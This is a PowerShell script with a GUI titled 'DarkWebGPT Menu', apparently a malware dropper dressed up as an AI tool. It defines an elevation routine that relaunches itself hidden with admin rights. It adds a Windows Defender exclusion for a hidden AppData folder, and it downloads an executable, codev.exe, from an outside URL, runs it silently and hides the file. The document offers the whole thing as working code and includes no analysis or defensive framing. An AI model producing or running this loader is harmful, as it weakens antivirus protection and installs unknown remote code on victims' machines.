Add-Type -AssemblyName System.Windows.Forms

# Function to check if running with elevated privileges
function Test-AdminRights {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Function to elevate if not running with admin rights
function Start-Elevated {
    if (-not (Test-AdminRights)) {
        $scriptPath = $MyInvocation.MyCommand.Path
        $arguments = $MyInvocation.BoundParameters.GetEnumerator() | ForEach-Object { "-$($_.Key) '$($_.Value)'" } -join ' '
        Start-Process powershell.exe -WindowStyle Hidden -Verb RunAs -ArgumentList "-File `"$scriptPath`" $arguments"
        exit
    }
}

# Function to set exclusions in Windows Defender and create hidden folder
function Set-ExclusionsAndHideFolder {
    try {
        # Set up exclusion path in Windows Defender
        Add-MpPreference -ExclusionPath "C:\Users\$env:USERNAME\AppData\Local\Anon"

        # Create hidden folder and set attributes
        $folderPath = "C:\Users\$env:USERNAME\AppData\Local\Anon"
        if (-not (Test-Path $folderPath)) {
            New-Item -ItemType Directory -Path $folderPath | Out-Null
        }
        Set-ItemProperty -Path $folderPath -Name Attributes -Value ([IO.FileAttributes]::Hidden)

        # Display success message
        [System.Windows.Forms.MessageBox]::Show("Exclusions set and folder hidden successfully!", "Success", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
    }
    catch {
        Write-Error "Error occurred: $_"
        [System.Windows.Forms.MessageBox]::Show("Error occurred. Check PowerShell console for details.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    }
}

# Function to download and execute codev.exe
function Download-And-Execute {
    try {
        $exeUrl = 'https://codev-zeta.vercel.app/codev.exe'
        $exePath = Join-Path $env:TEMP 'codev.exe'
        
        # Download codev.exe
        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -ErrorAction Stop

        # Execute codev.exe silently
        Start-Process -FilePath $exePath -WindowStyle Hidden -ErrorAction Stop

        # Set hidden attribute for codev.exe
        $fileAttributes = [System.IO.FileAttributes]::Hidden
        (Get-Item $exePath).Attributes = $fileAttributes

        # Display success message
        [System.Windows.Forms.MessageBox]::Show("codev.exe downloaded and executed successfully!", "Success", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
    }
    catch {
        Write-Error "Error occurred: $_"
        [System.Windows.Forms.MessageBox]::Show("Error occurred. Check PowerShell console for details.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    }
}

# Create GUI form
$form = New-Object System.Windows.Forms.Form
$form.Text = "DarkWebGPT Menu"
$form.Size = New-Object System.Drawing.Size(400, 250)
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$form.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen
$form.Topmost = $true

# Label for action selection
$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(10, 20)
$label.Size = New-Object System.Drawing.Size(380, 20)
$label.Text = "Choose an action to perform:"
$form.Controls.Add($label)

# Button for setting exclusions and hiding folder
$button1 = New-Object System.Windows.Forms.Button
$button1.Location = New-Object System.Drawing.Point(50, 60)
$button1.Size = New-Object System.Drawing.Size(300, 30)
$button1.Text = "Set Exclusions and Hide Folder"
$button1.Add_Click({
    # Call function to set exclusions and hide folder
    Set-ExclusionsAndHideFolder
})
$form.Controls.Add($button1)

# Button for downloading and executing codev.exe
$button2 = New-Object System.Windows.Forms.Button
$button2.Location = New-Object System.Drawing.Point(50, 120)
$button2.Size = New-Object System.Drawing.Size(300, 30)
$button2.Text = "Download and Execute codev.exe"
$button2.Add_Click({
    # Call function to download and execute codev.exe
    Download-And-Execute
})
$form.Controls.Add($button2)

# Show the form
$form.ShowDialog() | Out-Null
$form.Dispose()
